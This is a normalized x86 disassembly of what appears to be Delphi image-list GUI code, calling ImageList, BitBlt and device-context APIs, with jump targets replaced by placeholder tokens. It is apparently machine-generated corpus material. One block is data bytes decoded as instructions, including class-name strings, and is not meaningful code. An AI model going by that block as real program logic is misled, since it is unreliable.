mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_454e10
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_454dfc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_455358
sub_455460
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_4554d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404414
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418310
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418310
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_455540
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_455598
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404414
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_4555f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_455654
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_4556b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418310
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_455718
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404414
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420c6c
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4552f8
sub_455764
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45578c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_454c18
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_455358
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_455820
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a268
mov edi eax
mov eax esi
call sub_458244
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_45584c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_455890
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4558b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558bc
retn
sub_4558f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx + 0x45 ] bl
add [ eax + 0x59 ] al
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
dec esp
outsd
inc ebp
add [ ecx ] al
add bh bh
inc [ eax + 0xb00456f ]
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
mov ah 0x59
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop ecx
inc ebp
add [ eax ] al
pop edx
inc ebp
add [ eax ] ch
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
sub_455a80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_455acc
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4183f8
mov edx eax
mov eax edi
call sub_4566bc
mov eax [ edi + 0x50 ]
call sub_403290
mov eax edi
call sub_455d90
mov eax [ edi + 0x4c ]
call sub_403290
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
call sub_403290
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
sub_455b38
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_455be5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_456644
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_455c04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bec
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_455c04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_455ca5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_428094
mov eax ebx
call sub_427574
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423fb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416cd4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_427574
pop edx
call sub_4243a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455cac
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_455cc8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_455c04
pop ecx
pop edx
pop ebx
retn
sub_455d00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455d90
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_455cc8
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40348c
sub_455d3c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4565cc
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4275e0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455d90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_455d2c
push eax
call ImageList_Destroy
sub_455dc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_455e5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_455bf0
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455e62
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx eax
mov eax ebx
call sub_455ff0
sub_455e68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_455f17
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_455efa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_455bf8
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455d3c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455d3c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f01
mov eax [ ebp - 0x10 ]
call sub_403290
retn
sub_455f34
push ebx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_455d2c
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_455f58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455fd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_455f34
cmp esi eax
jl r-xdata
mov eax ebx
call sub_455bf0
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax ebx
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455fde
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push esi
mov eax ebx
call sub_455d2c
push eax
call ImageList_Remove
sub_455ff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_455a40
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
sub_456028
push ebx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_455d2c
push eax
call ImageList_GetBkColor
call sub_455a60
pop ebx
retn
sub_456050
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_455a40
push eax
mov eax ebx
call sub_456028
call sub_455a40
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_4248b4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_455d2c
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_427574
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423fb4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416cd4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_427574
pop edx
call sub_4243a0
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_427574
call sub_4248b4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_455d2c
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416cd4
mov eax [ ebx + 0x54 ]
call sub_427574
call sub_4248b4
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_423fb4
mov eax edi
call sub_4248b4
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_423fb4
mov eax edi
call sub_4248b4
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4282e4
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_456224
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_456248
pop ebx
pop ebp
retn 0xc
sub_456248
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_456294
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416cd4
mov eax [ ebp - 0x4 ]
call sub_456f28
xor eax eax
push ebp
push sub_45642d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456410
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4563f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4282e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563fa
mov eax [ ebp - 0x10 ]
call sub_403290
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_427574
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4243a0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4248b4
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_427574
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4243a0
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_4248b4
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455e68
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45643c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_455d2c
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_456294
sub_45645c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
call sub_455d90
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41890c
mov eax ebx
call sub_455fe4
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_456644
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_455d2c
mov edx eax
mov eax ebx
call sub_455cc8
mov eax ebx
call sub_455bf0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_455d2c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_455bf8
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_455d2c
push eax
call ImageList_GetBkColor
call sub_455a60
mov edx eax
mov eax ebx
call sub_455ff0
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45643c
jmp r-xdata
sub_45651c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4189f0
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_456644
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_455fe4
mov eax esi
call sub_455d2c
mov edx eax
mov eax ebx
call sub_455cc8
mov eax ebx
call sub_455bf0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_455d2c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_455bf8
jmp r-xdata
mov eax esi
call sub_455d2c
push eax
call ImageList_GetBkColor
call sub_455a60
mov edx eax
mov eax ebx
call sub_455ff0
mov edx esi
mov eax ebx
call sub_45643c
pop esi
pop ebx
retn
sub_4565cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456638
push [ fs : eax ]
